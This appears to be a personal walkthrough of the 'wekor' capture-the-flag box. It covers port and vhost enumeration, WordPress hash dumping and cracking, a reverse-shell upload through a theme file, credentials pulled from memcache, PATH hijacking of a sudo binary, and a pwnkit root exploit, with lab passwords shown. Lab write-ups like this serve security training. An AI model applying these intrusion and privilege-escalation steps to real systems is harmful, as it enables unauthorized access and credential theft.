
# Box Name
## wekor
---

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```
rustscan -a 10.10.228.218 --ulimit 9000                                       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢


[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.96.128:22
Open 10.10.96.128:80

Nmap 7.91 scan initiated Sun Mar  7 16:23:30 2021 as: nmap -vvv -p 22,80 -sC -sV -oN nmap/initial 10.10.42.55
Nmap scan report for 10.10.42.55
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-03-07 16:23:30 CST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

# ferox
- ### initial scan
```
ferox -u http://wekor.thm -w /usr/share/wordlists/dirb/common.txt -t 10 -x html,txt,php -o logs/ferox.md
	
	───────────────────────────┬──────────────────────
	 🎯  Target Url            │ http://10.10.96.128
	 🚀  Threads               │ 10
	 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
	 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
	 💥  Timeout (secs)        │ 7
	 🦡  User-Agent            │ feroxbuster/1.10.3
	 💾  Output File           │ logs/ferox.md
	 💲  Extensions            │ [html, txt, php]
	 🔃  Recursion Depth       │ 4
	 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
	───────────────────────────┴──────────────────────
	 ⏯   Press [ENTER] to pause|resume your scan
	──────────────────────────────────────────────────
200       10l       20w      188c http://wekor.thm/robots.txt
200        1l        3w       23c http://wekor.thm/index.html
```


- ## wekor.thm/robots.txt

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting

```

- ## from robots.txt  /comingreallysoon  has
```
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !

```

- ##  /it-next has a web site on it
![[Pasted image 20220309180854.png]]
- ### ffuf vhost scan

	```
	
	ffuf -c -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://wekor.thm -H "Host: FUZZ.wekor.thm"  -t 100 -fw 3
	
			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       
	
		   v1.3.1
	________________________________________________
	
	 :: Method           : GET
	 :: URL              : http://wekor.thm
	 :: Wordlist         : FUZZ: /home/scott/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
	 :: Header           : Host: FUZZ.wekor.thm
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 100
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 3
	________________________________________________
	
	site                    [Status: 200, Size: 143, Words: 27, Lines: 6]
	
	```
	- #### found possible user name at site.wekor.thm
	```
	Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim
	
	```

- ## ferox scan on vhost
```
ferox -u http://site.wekor.thm -w /usr/share/wordlists/dirb/common.txt -t 10 -x html,txt,php -o logs/ferox.md
	
	───────────────────────────┬──────────────────────
	 🎯  Target Url            │ http://10.10.96.128
	 🚀  Threads               │ 10
	 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
	 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
	 💥  Timeout (secs)        │ 7
	 🦡  User-Agent            │ feroxbuster/1.10.3
	 💾  Output File           │ logs/ferox.md
	 💲  Extensions            │ [html, txt, php]
	 🔃  Recursion Depth       │ 4
	 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
	───────────────────────────┴──────────────────────
	 ⏯   Press [ENTER] to pause|resume your scan
	──────────────────────────────────────────────────
200        5l       29w      143c http://site.wekor.thm/index.html
301        9l       28w      320c http://site.wekor.thm/wordpress
301        0l        0w        0c http://site.wekor.thm/wordpress/index.php
301        9l       28w      329c http://site.wekor.thm/wordpress/wp-admin
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/index.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-signup.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/media.php
405        1l        6w       42c http://site.wekor.thm/wordpress/xmlrpc.php
301        9l       28w      338c http://site.wekor.thm/wordpress/wp-admin/includes
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/term.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/export.php
200       23l       80w     1313c http://site.wekor.thm/wordpress/wp-admin/upgrade.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-blog-header.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-cron.php
200       97l      460w     7896c http://site.wekor.thm/wordpress/wp-login.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/bookmark.php
301        9l       28w      335c http://site.wekor.thm/wordpress/wp-admin/maint
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/media.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/options.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-load.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/plugin.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/privacy.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/import.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/export.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/theme.php
200       11l       24w      230c http://site.wekor.thm/wordpress/wp-links-opml.php
301        9l       28w      337c http://site.wekor.thm/wordpress/wp-admin/network
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/options.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/index.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/edit.php
200      384l     3177w    19915c http://site.wekor.thm/wordpress/license.txt
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-config.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/post.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/import.php
301        9l       28w      331c http://site.wekor.thm/wordpress/wp-content
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/themes.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/setup.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/moderation.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/users.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/about.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/admin.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/network.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-content/index.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/post.php
200       97l      823w     7278c http://site.wekor.thm/wordpress/readme.html
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/tools.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/link.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/update.php
200        5l       15w      135c http://site.wekor.thm/wordpress/wp-trackback.php
301        9l       28w      334c http://site.wekor.thm/wordpress/wp-admin/user
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/upgrade.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/taxonomy.php
301        9l       28w      332c http://site.wekor.thm/wordpress/wp-includes
301        9l       28w      339c http://site.wekor.thm/wordpress/wp-content/upgrade
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/image.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/customize.php
301        9l       28w      332c http://site.wekor.thm/wordpress/wp-admin/js
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/screen.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/user/index.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/dashboard.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/update.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/sites.php
301        9l       28w      341c http://site.wekor.thm/wordpress/wp-content/languages
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/user.php
301        9l       28w      336c http://site.wekor.thm/wordpress/wp-admin/images
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/bookmark.php
200       17l       83w     1337c http://site.wekor.thm/wordpress/wp-admin/install.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/upload.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/privacy.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/credits.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/formatting.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/plugin.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/widgets.php
301        9l       28w      333c http://site.wekor.thm/wordpress/wp-admin/css
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/comment.php
301        9l       28w      345c http://site.wekor.thm/wordpress/wp-includes/certificates
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/profile.php
301        9l       28w      339c http://site.wekor.thm/wordpress/wp-content/uploads
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/plugins.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/theme.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/edit.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/misc.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/widgets.php
301        9l       28w      339c http://site.wekor.thm/wordpress/wp-includes/blocks
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/blocks.php
301        9l       28w      347c http://site.wekor.thm/wordpress/wp-includes/blocks/columns
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/themes.php
301        9l       28w      338c http://site.wekor.thm/wordpress/wp-content/themes
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/includes/comment.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/embed.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-content/themes/index.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/users.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/http.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/feed.php
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/cron.php
301        9l       28w      345c http://site.wekor.thm/wordpress/wp-includes/blocks/embed
301        9l       28w      344c http://site.wekor.thm/wordpress/wp-includes/blocks/more
301        9l       28w      345c http://site.wekor.thm/wordpress/wp-includes/blocks/video
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/network/update.php
301        9l       28w      338c http://site.wekor.thm/wordpress/wp-includes/fonts
301        9l       28w      345c http://site.wekor.thm/wordpress/wp-includes/blocks/table
301        9l       28w      347c http://site.wekor.thm/wordpress/wp-includes/blocks/missing
200        0l        0w        0c http://site.wekor.thm/wordpress/wp-includes/template.php
302        0l        0w        0c http://site.wekor.thm/wordpress/wp-admin/user/profile.php
301        9l       28w      346c http://site.wekor.thm/wordpress/wp-includes/blocks/spacer
301        9l       28w      345c http://site.wekor.thm/wordpress/wp-includes/blocks/group


```

- ### sqlmap
```
mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. |
| wp_jeffrey | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 |
| wp_yura    | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ |
| wp_eagle   | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ |
+------------+------------------------------------+
4 rows in set (0.00 sec)

```

- ## using john hashes cracked
```
jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 :rockyou
yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ :soccer13
eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ :xxxxxx

```
## Initial Foothold
---
# wordpress
- ## uploaded a php [[revshell]]  using the 404.php


# enumeration
- ## linpeas output
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               



╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'root123@#59' );
define( 'DB_HOST', 'localhost' );


```

- # Port 11211  maybe interesting???
```bash
www-data@osboxes:/tmp$ ps aux | grep 11211
memcache   965  0.0  0.1  47724  1812 ?        Ssl  11:06   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
www-data  8405  0.0  0.0   3036   836 pts/8    S+   13:04   0:00 grep 11211
www-data@osboxes:/tmp$ 

```
---
## Privilege Escalation
----
# memcache
- ## googled memcache

```
stats cachedump 1 0
ITEM password [15 b; 1646928302 s]
ITEM id [4 b; 1646928302 s]
ITEM email [14 b; 1646928302 s]
ITEM salary [8 b; 1646928302 s]
ITEM username [4 b; 1646928302 s]
END
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
OrkAiSC00L24/7$
END

```

- ## su to Orka
```
www-data@osboxes:/tmp$ su Orka
Password: 
Orka@osboxes:/tmp$ id
uid=1001(Orka) gid=1001(Orka) groups=1001(Orka)
Orka@osboxes:~$ 
```

```
Orka@osboxes:~/Desktop$ sudo -l
[sudo] password for Orka: 
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
Orka@osboxes:~/Desktop$

```

- ## downloaded the bitcoin file and opened in Ghidra
- ### found hardcoded password in main function
```c
  printf("Enter the password : ");
  gets(local_87);
  iVar1 = strcmp(local_87,"password");
  if (iVar1 == 0) {
    puts("Access Granted...");

```

- ## $PATH injection
	- ### need to find a dir that was writable
	```bash
	Orka@osboxes:~/Desktop$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
Orka@osboxes:~/Desktop$ ls -la /usr
total 124
drwxr-xr-x  11 root root  4096 Feb 26  2019 .
drwxr-xr-x  23 root root  4096 Jan 23  2021 ..
drwxr-x--x   2 root Orka 57344 Jan 26  2021 bin
drwxr-xr-x   2 root root  4096 Feb 26  2019 games
drwxr-xr-x  37 root root 16384 Jan 23  2021 include
drwxr-xr-x 142 root root  4096 Jan 26  2021 lib
drwxr-xr-x  10 root root  4096 Feb 26  2019 local
drwxr-xr-x   3 root root  4096 Feb 26  2019 locale
drwxrwxr-x   2 root Orka 12288 Jan 23  2021 sbin
drwxr-xr-x 300 root root 12288 Jan 26  2021 share
drwxr-xr-x   6 root root  4096 Jan 23  2021 src
Orka@osboxes:~/Desktop$
	```

- ## /usr/sbin is the first writable dir in $PATH
	- use /usr/sbin to create my own python file
	- chmod +x /usr/sbin/python

- ## run the bitcoin binary and get root shell
```
Orka@osboxes:~/Desktop$ sudo ./bitcoin 
[sudo] password for Orka: 
Enter the password : password
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 10000
root@osboxes:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
root@osboxes:~/Desktop#

```


# CVE-2021-4034
- ## uploaded pwnkit.c exploit got root shell
```bash
www-data@osboxes:/tmp$ ./pwnd
# bash
root@osboxes:/tmp# 

```